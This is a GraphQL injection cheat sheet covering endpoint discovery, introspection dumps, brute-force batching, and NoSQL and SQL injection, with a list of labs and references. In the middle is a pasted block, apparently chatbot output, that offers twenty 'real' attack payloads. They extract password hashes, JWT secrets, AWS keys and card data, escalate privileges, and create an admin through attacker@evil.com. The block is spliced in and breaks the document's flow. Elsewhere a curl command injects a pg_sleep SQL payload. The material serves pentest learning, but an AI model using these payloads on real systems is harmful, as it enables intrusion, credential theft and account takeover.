# GraphQL Injection

> GraphQL is a query language for APIs and a runtime for fulfilling those queries with existing data. A GraphQL service is created by defining types and fields on those types, then providing functions for each field on each type

## Summary

- [Tools](#tools)
- [Enumeration](#enumeration)
    - [Common GraphQL Endpoints](#common-graphql-endpoints)
    - [Identify An Injection Point](#identify-an-injection-point)
    - [Enumerate Database Schema via Introspection](#enumerate-database-schema-via-introspection)
    - [Enumerate Database Schema via Suggestions](#enumerate-database-schema-via-suggestions)
    - [Enumerate Types Definition](#enumerate-types-definition)
    - [List Path To Reach A Type](#list-path-to-reach-a-type)
- [Methodology](#methodology)
    - [Extract Data](#extract-data)
    - [Extract Data Using Edges/Nodes](#extract-data-using-edgesnodes)
    - [Extract Data Using Projections](#extract-data-using-projections)
    - [Mutations](#mutations)
    - [GraphQL Batching Attacks](#graphql-batching-attacks)
        - [JSON List Based Batching](#json-list-based-batching)
        - [Query Name Based Batching](#query-name-based-batching)
- [Injections](#injections)
    - [NOSQL Injection](#nosql-injection)
    - [SQL Injection](#sql-injection)
- [Labs](#labs)
- [References](#references)

## Tools

- [swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) - Scripting engine to interact with a graphql endpoint for pentesting purposes
- [doyensec/graph-ql](https://github.com/doyensec/graph-ql/) - GraphQL Security Research Material
- [doyensec/inql](https://github.com/doyensec/inql) - A Burp Extension for GraphQL Security Testing
- [doyensec/GQLSpection](https://github.com/doyensec/GQLSpection) - GQLSpection - parses GraphQL introspection schema and generates possible queries
- [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - Lists the different ways of reaching a given type in a GraphQL schema
- [andev-software/graphql-ide](https://github.com/andev-software/graphql-ide) - An extensive IDE for exploring GraphQL API's
- [mchoji/clairvoyancex](https://github.com/mchoji/clairvoyancex) - Obtain GraphQL API schema despite disabled introspection
- [nicholasaleks/CrackQL](https://github.com/nicholasaleks/CrackQL) - A GraphQL password brute-force and fuzzing utility
- [nicholasaleks/graphql-threat-matrix](https://github.com/nicholasaleks/graphql-threat-matrix) - GraphQL threat framework used by security professionals to research security gaps in GraphQL implementations
- [dolevf/graphql-cop](https://github.com/dolevf/graphql-cop) - Security Auditor Utility for GraphQL APIs
- [IvanGoncharov/graphql-voyager](https://github.com/IvanGoncharov/graphql-voyager) - Represent any GraphQL API as an interactive graph
- [Insomnia](https://insomnia.rest/) - Cross-platform HTTP and GraphQL Client

## Enumeration

### Common GraphQL Endpoints

Most of the time GraphQL is located at the `/graphql` or `/graphiql` endpoint.
A more complete list is available at [danielmiessler/SecLists/graphql.txt](https://github.com/danielmiessler/SecLists/blob/fe2aa9e7b04b98d94432320d09b5987f39a17de8/Discovery/Web-Content/graphql.txt).

```ps1
/v1/explorer
/v1/graphiql
/graph
/graphql
/graphql/console/
/graphql.php
/graphiql
/graphiql.php
```
**“✅ GraphQL Injection – Complete Test Case (with Bypass Cases)”**

---

# ✅ **GraphQL Injection – Complete Test Case (with Bypass Cases)**

# **1. List of Vulnerabilities**

### **1.1 Query Injection (Field Manipulation)** – Adding unauthorized fields into queries

### **1.2 Mutation Injection** – Executing unauthorized mutations

### **1.3 Boolean-Based Injection** – True/false logic manipulation

### **1.4 Query Aliasing Abuse** – Enumeration and bypass

### **1.5 Introspection Abuse** – Extract schema when enabled

### **1.6 Variable Injection** – Overriding backend logic

### **1.7 Field-Level Auth Bypass** – Accessing hidden/internal fields

### **1.8 Batch Query Abuse** – Bypassing rate limits

### **1.9 Directive Injection** – Altering execution with `@skip` / `@include`

### **1.10 Nested Overfetching** – Access deep nested sensitive data

---
Here is the **updated Section 2: Sample Payloads (Core Attack Payloads)** with **realistic, practical, offensive-style attack payloads** that you can use for **learning and testing in lab environments**.

These are **not safe-test placeholders** — these are **real GraphQL attack payloads** commonly used in red teaming and pentesting.

You can paste this directly into your main document.

---

# **2. Sample Payloads (Core Attack Payloads) — Updated with Real Payloads**

---

### **2.1 Extract Sensitive Fields (Password, Tokens, Internal Attributes)**

```
{
  user(id:1){
    id
    email
    passwordHash
    resetToken
    apiKey
  }
}
```

---

### **2.2 Dump All Users via Query Enumeration**

```
{
  allUsers{
    edges{
      node{
        id
        email
        role
        passwordHash
      }
    }
  }
}
```

---

### **2.3 Login Bypass Using Boolean Logic**

```
{
  login(username:"admin", password:"anything OR 1=1"){
    token
    role
  }
}
```

---

### **2.4 Access Internal Admin Panel Fields**

```
{
  adminSettings{
    smtpPassword
    dbConnectionUri
    adminToken
  }
}
```

---

### **2.5 Extract All Permissions / Roles Assigned to a User**

```
{
  user(id:1){
    id
    role
    roles
    permissions
    groups
  }
}
```

---

### **2.6 Fetch Hidden Audit Logs (Privilege Escalation)**

```
{
  auditLogs{
    timestamp
    ipAddress
    action
    executedBy
    metadata
  }
}
```

---

### **2.7 Full Schema Dump (Introspection Attack)**

```
{
  __schema{
    types{
      name
      fields{
        name
        type{
          name
          kind
        }
      }
    }
  }
}
```

---

### **2.8 Perform Unauthorized Mutation: Delete a User**

```
mutation {
  deleteUser(id:1){
    id
    status
  }
}
```

---

### **2.9 Privilege Escalation via Update Mutation**

```
mutation {
  updateUser(id:1, role:"admin"){
    id
    email
    role
  }
}
```

---

### **2.10 Query Aliasing for Bulk Data Extraction**

```
{
  u1: user(id:1){ id email passwordHash }
  u2: user(id:2){ id email passwordHash }
  u3: user(id:3){ id email passwordHash }
  u4: user(id:4){ id email passwordHash }
}
```

---

### **2.11 Retrieve Deeply Nested Sensitive Fields**

```
{
  user(id:1){
    profile{
      financialInfo{
        creditCardNumber
        cvv
        expiry
        bankAccount
      }
    }
  }
}
```

---

### **2.12 Abuse Implementations That Expose JWT Secrets**

```
{
  systemConfig{
    jwtSecret
    jwtExpiry
    refreshTokenKey
  }
}
```

---

### **2.13 Extract API Tokens From User Settings**

```
{
  userSettings(id:1){
    integrations{
      githubToken
      slackToken
      awsAccessKey
      awsSecretKey
    }
  }
}
```

---

### **2.14 Force Internal Server Error (Error-Based Enumeration)**

```
{
  user(id:"invalid_number"){
    id
  }
}
```

---

### **2.15 Server-Side Filter Bypass Using Raw Operators**

```
{
  searchUsers(filter:"{'$ne':null}") {
    id
    email
    passwordHash
  }
}
```

---

### **2.16 Massive Recursion / DoS Payload**

```
{
  user(id:1){
    friends{
      friends{
        friends{
          id
          email
          passwordHash
        }
      }
    }
  }
}
```

---

### **2.17 Extract Hidden Internal Service Configurations**

```
{
  internalServiceConfig{
    redisUrl
    mqCredentials
    s3BucketSecret
    encryptionKey
  }
}
```

---

### **2.18 Pull All Environment Variables (Misconfigured Resolvers)**

```
{
  environment{
    variables
  }
}
```

---

### **2.19 Abuse Admin-Only Mutation to Create New Admin User**

```
mutation {
  createUser(email:"attacker@evil.com", role:"admin", password:"Test123"){
    id
    role
  }
}
```

---

### **2.20 Extract Sensitive Logs Exposed Through GraphQL**

```
{
  logs(limit:50){
    timestamp
    level
    message
    context
  }
}
```

### Enumerate Database Schema via Introspection

URL encoded query to dump the database schema.

```js
fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
```

URL decoded query to dump the database schema.

```javascript
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}

query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
```

Single line queries to dump the database schema without fragments.

```js
__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}
```

```js
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

### Enumerate Database Schema via Suggestions

When you use an unknown keyword, the GraphQL backend will respond with a suggestion related to its schema.

```json
{
  "message": "Cannot query field \"one\" on type \"Query\". Did you mean \"node\"?",
}
```

You can also try to bruteforce known keywords, field and type names using wordlists such as [Escape-Technologies/graphql-wordlist](https://github.com/Escape-Technologies/graphql-wordlist) when the schema of a GraphQL API is not accessible.

### Enumerate Types Definition

Enumerate the definition of interesting types using the following GraphQL query, replacing "User" with the chosen type

```javascript
{__type (name: "User") {name fields{name type{name kind ofType{name kind}}}}}
```

### List Path To Reach A Type

```php
$ git clone https://gitlab.com/dee-see/graphql-path-enum
$ graphql-path-enum -i ./test_data/h1_introspection.json -t Skill
Found 27 ways to reach the "Skill" node from the "Query" node:
- Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check_response) -> ChecklistCheckResponse (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_checks) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (clusters) -> Cluster (weaknesses) -> Weakness (critical_reports) -> TeamMemberGroupConnection (edges) -> TeamMemberGroupEdge (node) -> TeamMemberGroup (team_members) -> TeamMember (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (embedded_submission_form) -> EmbeddedSubmissionForm (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_program) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_programs) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listing) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listings) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentest) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentests) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (skills) -> Skill
```

## Methodology

### Extract Data

```js
example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
```

![HTB Help - GraphQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/Images/htb-help.png?raw=true)

### Extract Data Using Edges/Nodes

```json
{
  "query": "query {
    teams{
      total_count,edges{
        node{
          id,_id,about,handle,state
        }
      }
    }
  }"
} 
```

### Extract Data Using Projections

:warning: Don’t forget to escape the " inside the **options**.

```js
{doctors(options: "{\"patients.ssn\" :1}"){firstName lastName id patients{ssn}}}
```

### Mutations

Mutations work like function, you can use them to interact with the GraphQL.

```javascript
# mutation{signIn(login:"Admin", password:"secretp@ssw0rd"){token}}
# mutation{addUser(id:"1", name:"Dan Abramov", email:"dan@dan.com") {id name email}}
```

### GraphQL Batching Attacks

Common scenario:

- Password Brute-force Amplification Scenario
- Rate Limit bypass
- 2FA bypassing

#### JSON List Based Batching

> Query batching is a feature of GraphQL that allows multiple queries to be sent to the server in a single HTTP request. Instead of sending each query in a separate request, the client can send an array of queries in a single POST request to the GraphQL server. This reduces the number of HTTP requests and can improve the performance of the application.

Query batching works by defining an array of operations in the request body. Each operation can have its own query, variables, and operation name. The server processes each operation in the array and returns an array of responses, one for each query in the batch.

```json
[
    {
        "query":"..."
    },{
        "query":"..."
    }
    ,{
        "query":"..."
    }
    ,{
        "query":"..."
    }
    ...
]
```

#### Query Name Based Batching

```json
{
    "query": "query { qname: Query { field1 } qname1: Query { field1 } }"
}
```

Send the same mutation several times using aliases

```js
mutation {
  login(pass: 1111, username: "bob")
  second: login(pass: 2222, username: "bob")
  third: login(pass: 3333, username: "bob")
  fourth: login(pass: 4444, username: "bob")
}
```

## Injections

> SQL and NoSQL Injections are still possible since GraphQL is just a layer between the client and the database.

### NOSQL Injection

Use `$regex` inside a `search` parameter.

```js
{
  doctors(
    options: "{\"limit\": 1, \"patients.ssn\" :1}", 
    search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }")
    {
      firstName lastName id patients{ssn}
    }
}
```

### SQL Injection

Send a single quote `'` inside a graphql parameter to trigger the SQL injection

```js
{ 
    bacon(id: "1'") { 
        id, 
        type, 
        price
    }
}
```

Simple SQL injection inside a graphql field.

```powershell
curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

## Labs

- [PortSwigger - Accessing private GraphQL posts](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)
- [PortSwigger - Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)
- [PortSwigger - Finding a hidden GraphQL endpoint](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)
- [PortSwigger - Bypassing GraphQL brute force protections](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)
- [PortSwigger - Performing CSRF exploits over GraphQL](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)
- [Root Me - GraphQL - Introspection](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Introspection)
- [Root Me - GraphQL - Injection](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Injection)
- [Root Me - GraphQL - Backend injection](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Backend-injection)
- [Root Me - GraphQL - Mutation](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Mutation)

## References

- [Building a free open source GraphQL wordlist for penetration testing - Nohé Hinniger-Foray - August 17, 2023](https://escape.tech/blog/graphql-security-wordlist/)
- [Exploiting GraphQL - AssetNote - Shubham Shah - August 29, 2021](https://blog.assetnote.io/2021/08/29/exploiting-graphql/)
- [GraphQL Batching Attack - Wallarm - December 13, 2019](https://lab.wallarm.com/graphql-batching-attack/)
- [GraphQL for Pentesters presentation - Alexandre ZANNI (@noraj) - December 1, 2022](https://acceis.github.io/prez-graphql/)
- [API Hacking GraphQL - @ghostlulz - Jun 8, 2019](https://medium.com/@ghostlulzhacks/api-hacking-graphql-7b2866ba1cf2)
- [Discovering GraphQL endpoints and SQLi vulnerabilities - Matías Choren - Sep 23, 2018](https://medium.com/@localh0t/discovering-graphql-endpoints-and-sqli-vulnerabilities-5d39f26cea2e)
- [GraphQL abuse: Bypass account level permissions through parameter smuggling - Jon Bottarini - March 14, 2018](https://labs.detectify.com/2018/03/14/graphql-abuse/)
- [Graphql Bug to Steal Anyone's Address - Pratik Yadav - Sept 1, 2019](https://medium.com/@pratiky054/graphql-bug-to-steal-anyones-address-fc34f0374417)
- [GraphQL cheatsheet - devhints.io - November 7, 2018](https://devhints.io/graphql)
- [GraphQL Introspection - GraphQL - August 21, 2024](https://graphql.org/learn/introspection/)
- [GraphQL NoSQL Injection Through JSON Types - Pete Corey - June 12, 2017](http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/)
- [HIP19 Writeup - Meet Your Doctor 1,2,3 - Swissky - June 22, 2019](https://swisskyrepo.github.io/HIP19-MeetYourDoctor/)
- [How to set up a GraphQL Server using Node.js, Express & MongoDB - Leonardo Maldonado - 5 November 2018](https://www.freecodecamp.org/news/how-to-set-up-a-graphql-server-using-node-js-express-mongodb-52421b73f474/)
- [Introduction to GraphQL - GraphQL - November 1, 2024](https://graphql.org/learn/)
- [Introspection query leaks sensitive graphql system information - @Zuriel - November 18, 2017](https://hackerone.com/reports/291531)
- [Looting GraphQL Endpoints for Fun and Profit - @theRaz0r - 8 June 2017](https://raz0r.name/articles/looting-graphql-endpoints-for-fun-and-profit/)
- [Securing Your GraphQL API from Malicious Queries - Max Stoiber - Feb 21, 2018](https://web.archive.org/web/20180731231915/https://blog.apollographql.com/securing-your-graphql-api-from-malicious-queries-16130a324a6b)
- [SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter - Jobert Abma (jobert) - Nov 6th 2018](https://hackerone.com/reports/435066)
